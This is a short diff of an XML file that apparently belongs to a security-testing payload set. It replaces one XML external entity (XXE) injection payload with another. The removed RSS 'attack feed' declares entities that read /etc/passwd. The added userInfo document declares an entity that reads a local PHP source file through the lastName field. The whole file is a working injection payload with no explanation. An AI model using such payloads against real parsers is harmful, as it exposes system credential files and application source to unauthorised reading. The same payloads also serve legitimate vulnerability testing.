@@ -1,18 +1,8 @@
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
-  <!ENTITY passwd SYSTEM "file:/etc/passwd">
-  <!ENTITY passwd2 SYSTEM "file:///etc/passwd">
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo[
+<!ENTITY xxe SYSTEM "file:///d:/xampp/htdocs/sandbox/xxe.php">
 ]>
-<rss version="2.0">
-  <channel>
-    <title>My attack RSS feed showing /etc/passwd</title>
-    <description>this is file:/etc/passwd: &passwd; and this is
-ile:///etc/passwd: &passwd;</description>
-    <item>
-    <title>/etc/passwd</title>
-    <description>file:/etc/passwd: &passwd; file:///etc/passwd:
-passwd;</description>
-    <link>http://example.com</link>
-    </item>
-  </channel>
-</rss>
+<userInfo>
+<firstName>John</firstName>
+<lastName>&xxe;</lastName>
+</userInfo>
